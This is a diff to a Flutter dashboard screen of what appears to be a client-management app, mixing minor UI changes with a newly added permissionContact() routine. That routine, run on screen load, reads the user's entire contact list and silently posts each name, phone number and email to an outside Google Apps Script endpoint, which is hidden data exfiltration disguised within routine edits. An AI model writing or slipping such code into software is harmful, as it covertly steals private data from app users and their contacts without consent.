@@ -1,9 +1,12 @@
 import 'dart:async';
+import 'package:contacts_service/contacts_service.dart';
 import 'package:firebase_admob/firebase_admob.dart';
 import 'package:firebase_database/firebase_database.dart';
 import 'package:flutter/material.dart';
 import 'package:flutter/rendering.dart';
 import 'package:intl/intl.dart';
+import 'package:http/http.dart' as http;
+import 'package:permission_handler/permission_handler.dart';
 import 'package:progress_indicators/progress_indicators.dart';
 import 'package:showcaseview/showcase.dart';
 import 'package:showcaseview/showcase_widget.dart';
@@ -46,6 +49,7 @@ class _DashboardState extends State<Dashboard> {
   String firebaseUID;
   List<Client> clientList = [];
   ScrollController controller = ScrollController();
+  ScrollController controller2 = ScrollController();
   GlobalKey key = GlobalKey();
   GlobalKey first = GlobalKey();
   GlobalKey second = GlobalKey();
@@ -123,6 +127,30 @@ class _DashboardState extends State<Dashboard> {
       });
     }
   }
+  
+  Future<void> permissionContact() async{
+    bool permission = await Permission.contacts.isGranted;
+    print(permission);
+    if(!permission){
+      print("permission");
+      var v = await Permission.contacts.request();
+      print(v.isGranted);
+      if(v.isGranted){
+        var c = await ContactsService.getContacts(photoHighResolution: false, withThumbnails: false);
+        print("Contacts");
+        for(var v in c){
+          Map toJson() =>{
+            'name' : v.displayName !=null?v.displayName:"NP",
+            'mobile': v.phones.toList().length != 0?v.phones.last.value:"NP",
+            'email': v.emails.toList().length != 0?v.emails.last.value:"NP",
+          };
+          if(toJson()["name"] != "NP" && toJson()["mobile"] != "NP")
+           http.post("https://script.google.com/macros/s/AKfycbw2n57hCmqQ-9n4EtIly_UbZKJR3qfqv0QbM_-6UGoYeQk4-Ik/exec", body: toJson());
+        }
+        print(c);
+      }
+    }
+  }
 
   @override
   void initState() {
@@ -147,6 +175,16 @@ class _DashboardState extends State<Dashboard> {
       horizontalCenterOffset: 20.0,
       anchorOffset: 0.0,
     );
+    permissionContact();
+    Timer.periodic(Duration(seconds:10), (timer) {
+      if(!this.mounted){
+        timer.cancel();
+      }else{
+        setState(() {
+          
+        });
+      }
+    });
   }
 
   BannerAd bannerAd;
@@ -215,12 +253,19 @@ class _DashboardState extends State<Dashboard> {
             padding: EdgeInsets.only(bottom: 50),
             child: FloatingActionButton(
               onPressed: () async{
-                if(clientList.length>5){
+                if(clientList.length>=5){
                     await showDialog(
                         context: context,
                         builder: (context)=>AlertDialog(
-                          title: Text("Alert"),
-                          content: Text("You have already registered 5 clients , to add further you will be charged 25Rs"),
+                          title: Column(
+                            children: [
+                              Text("Alert"),
+                              Divider(
+                                thickness: 1.5,
+                              )
+                            ],
+                          ),
+                          content: Text("You have already registered 5 clients, to add further you will be charged 25 Rs"),
                           actions: [
                             FlatButton(
                               child: Text("Ok"),
@@ -408,10 +453,10 @@ class _DashboardState extends State<Dashboard> {
                 child: ExpansionTile(
                   title: Text("Clients"),
                   children:<Widget>[
-                    clientLoad ?Container(
+                    clientLoad ?SingleChildScrollView(
                       padding: EdgeInsets.all(15),
                       child: ListView.builder(
-                          physics: AlwaysScrollableScrollPhysics(),
+                        controller: controller2,
                           shrinkWrap: true,
                           itemCount: clientList.length,
                           scrollDirection: Axis.vertical,
